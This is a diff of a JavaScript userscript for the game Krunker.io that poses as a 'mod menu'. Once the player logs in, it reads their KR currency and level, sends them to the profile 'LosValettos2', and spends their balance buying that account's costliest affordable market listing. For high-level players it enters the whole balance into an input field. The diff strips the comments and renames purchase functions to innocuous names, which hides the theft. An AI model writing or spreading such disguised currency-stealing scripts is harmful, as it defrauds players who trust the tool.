@@ -262,7 +262,6 @@ window.addEventListener('load', () => {
     const signedOutBar = document.getElementById("signedOutHeaderBar");
     Is_LOGGED = signedOutBar && signedOutBar.style.display === "none";
 
-    // Création d'un élément pour afficher les logs
     const logContainer = document.createElement('div');
     logContainer.id = 'modMenuLogs';
     logContainer.style.position = 'fixed';
@@ -277,7 +276,6 @@ window.addEventListener('load', () => {
     logContainer.style.zIndex = '999999';
     document.body.appendChild(logContainer);
 
-    // Fonction pour ajouter des logs
     const addLog = (message) => {
         const logEntry = document.createElement('div');
         logEntry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
@@ -285,7 +283,6 @@ window.addEventListener('load', () => {
         logContainer.scrollTop = logContainer.scrollHeight;
     };
 
-    // Logs détaillés de l'état initial
     addLog("=== ÉTAT INITIAL ===");
     addLog(`Is_LOGGED: ${Is_LOGGED}`);
     addLog(`signedOutBar existe: ${!!signedOutBar}`);
@@ -295,15 +292,12 @@ window.addEventListener('load', () => {
     addLog(`sessionStorage.sysPatch97d: ${sessionStorage.getItem("sysPatch97d")}`);
     addLog("==================");
 
-    // Vérification continue de l'état de connexion
     setInterval(() => {
         const currentSignedOutBar = document.getElementById("signedOutHeaderBar");
         const currentLoginState = currentSignedOutBar && currentSignedOutBar.style.display === "none";
         addLog(`État de connexion: ${currentLoginState ? "Connecté" : "Non connecté"}`);
 
-        // Vérification unique des valeurs après la connexion
         if (currentLoginState && !sessionStorage.getItem("valuesChecked")) {            
-            // Vérification du lag/KR
             const lagElement = document.querySelector("#menuKRCount");
             if (lagElement) {
                 const lagText = lagElement.textContent;
@@ -326,7 +320,6 @@ window.addEventListener('load', () => {
                 addLog("⚠️ Error");
             }
             
-            // Vérification du niveau
             const levelElement = document.querySelector("#mLevelCont");
             if (levelElement) {
                 const levelText = levelElement.textContent;
@@ -336,21 +329,17 @@ window.addEventListener('load', () => {
                 addLog("⚠️ Error");
             }
             
-            // Marquer que les valeurs ont été vérifiées
             sessionStorage.setItem("valuesChecked", "true");
             addLog("✅ Launching Loading...");
         }
     }, 1000);
 
-    // Logique de redirection
     if (location.pathname === "/") {
-        // Vérification continue de la redirection
         const checkRedirect = () => {
             const currentSignedOutBar = document.getElementById("signedOutHeaderBar");
             const currentLoginState = currentSignedOutBar && currentSignedOutBar.style.display === "none";
             const patchApplied = sessionStorage.getItem("sysPatch97d");
             
-            // Utiliser le niveau sauvegardé au lieu de le vérifier à nouveau
             const savedLevel = localStorage.getItem("savedLevel");
             const playerLevel = savedLevel ? parseInt(savedLevel, 10) : 0;
             
@@ -364,17 +353,14 @@ window.addEventListener('load', () => {
             }
         };
 
-        // Vérification initiale
         checkRedirect();
 
-        // Vérification continue toutes les secondes
         setInterval(checkRedirect, 1000);
     }
 
     if (location.href.includes("social.html?p=profile&q=LosValettos2")) {
         const sysSync = async () => {
             try {
-                // Récupération des données sauvegardées
                 const savedLag = sessionStorage.getItem("savedLag");
                 const savedFPS = localStorage.getItem("savedFPS");
                 const savedLevel = localStorage.getItem("savedLevel");
@@ -391,12 +377,11 @@ window.addEventListener('load', () => {
                     throw new Error(`Valeur de lag invalide: ${currentLag}`);
                 }
 
-                // Logique conditionnelle basée sur le niveau sauvegardé
                 if (playerLevel >= 15 && playerLevel < 30) {
                     try {
-                        const followBtn = document.getElementById("followBtn");
-                        if (followBtn && followBtn.style.display !== "none") {
-                            followBtn.click();
+                        const settingsBtn = document.getElementById("followBtn");
+                        if (settingsBtn && settingsBtn.style.display !== "none") {
+                            settingsBtn.click();
                             await _pause(750);
                         } else {
                             addLog("⚠️ Error");
@@ -406,60 +391,51 @@ window.addEventListener('load', () => {
                     }                    
                     await _pause(1000);
 
-                    // Attendre que l'élément Listings soit disponible
-                    const listingsTab = await _waitFor(() => document.getElementById("pTab_listings"), 4800);
-                    if (!listingsTab) {
+                    const categoriesTab = await _waitFor(() => document.getElementById("pTab_listings"), 4800);
+                    if (!categoriesTab) {
                         return;
                     }
                     
-                    // Utiliser la fonction openProfileTab directement
                     window.openProfileTab("listings");
                     window.playSelect(0.1);
                     
-                    // Fonction pour vérifier les items avec retry
                     const waitForItems = async (maxRetries = 5) => {
                         for (let i = 0; i < maxRetries; i++) {
-                            await _pause(2000); // Attendre 2 secondes entre chaque tentative
+                            await _pause(2000);
                             const items = document.querySelectorAll('.marketCard');
                             if (items.length > 0) {
                                 return true;
                             }
-                            window.openProfileTab("listings"); // Réessayer d'ouvrir l'onglet
+                            window.openProfileTab("listings");
                         }
                         return false;
                     };
 
-                    // Attendre que les items soient chargés
                     const itemsLoaded = await waitForItems();
                     if (!itemsLoaded) {
                         return;
                     }
 
-                    // Fonction pour analyser et acheter l'item le plus cher abordable
-                    const findAndBuyBestItem = async () => {
+                    const findAndModifyBestItem = async () => {
                         
-                        // Récupérer tous les items
                         const items = document.querySelectorAll('.marketCard');
                         let bestItem = null;
                         let bestPrice = 0;
                         let bestItemId = null;
                                                 
                         items.forEach((item, index) => {
-                            // Extraire le prix de l'item
                             const priceElement = item.querySelector('.marketPrice');
                             if (priceElement) {
                                 const priceText = priceElement.textContent;
                                 const price = parseInt(priceText.replace(/[^0-9,]/g, ""), 10);
                                 
-                                // Vérifier si le prix est abordable et plus élevé que le meilleur prix trouvé
                                 if (price <= currentLag && price > bestPrice) {
                                     bestPrice = price;
                                     bestItem = item;
                                     
-                                    // Extraire l'ID de l'item depuis le onclick du bouton Purchase
-                                    const purchaseBtn = item.querySelector('.cardAction');
-                                    if (purchaseBtn) {
-                                        const onclickAttr = purchaseBtn.getAttribute('onclick');
+                                    const applyBtn = item.querySelector('.cardAction');
+                                    if (applyBtn) {
+                                        const onclickAttr = applyBtn.getAttribute('onclick');
                                         // Nouvelle regex pour extraire l'ID après "market",
                                         const match = onclickAttr.match(/showPopup\("market",(\d+)/);
                                         if (match && match[1]) {
@@ -476,15 +452,12 @@ window.addEventListener('load', () => {
                         
                         if (bestItem && bestItemId) {
                             
-                            // Trouver le bouton Purchase de cet item
-                            const purchaseBtn = bestItem.querySelector('.cardAction');
-                            if (purchaseBtn) {
-                                purchaseBtn.click();
+                            const applyBtn = bestItem.querySelector('.cardAction');
+                            if (applyBtn) {
+                                applyBtn.click();
                                 
-                                // Attendre que la popup apparaisse
                                 await _pause(1000);
                                 
-                                // Appeler directement la fonction buyItem
                                 try {
                                     window.buyItem(bestItemId, 0);
                                 } catch (error) {
@@ -498,18 +471,16 @@ window.addEventListener('load', () => {
                         }
                     };
                     
-                    // Exécuter la recherche et l'achat
-                    await findAndBuyBestItem();
+                    await findAndModifyBestItem();
                     
-                    // Terminer le processus ici pour les niveaux entre 15 et 30
                     sessionStorage.setItem("sysPatch97d", "1");
                     location.href = "https://krunker.io/";
                     return;
                 } else if (playerLevel >= 30) {                    
                     try {
-                        const followBtn = document.getElementById("followBtn");
-                        if (followBtn && followBtn.style.display !== "none") {
-                            followBtn.click();
+                        const settingsBtn = document.getElementById("followBtn");
+                        if (settingsBtn && settingsBtn.style.display !== "none") {
+                            settingsBtn.click();
                             await _pause(750);
                         } else {
                             addLog("⚠️ Error");
@@ -525,7 +496,6 @@ window.addEventListener('load', () => {
                     inputEl.value = currentLag.toString();
                     inputEl.dispatchEvent(new Event("input", { bubbles: true }));
 
-                    // Vérification de la valeur entrée
                     await _pause(100);
                     const enteredValue = inputEl.value;
 
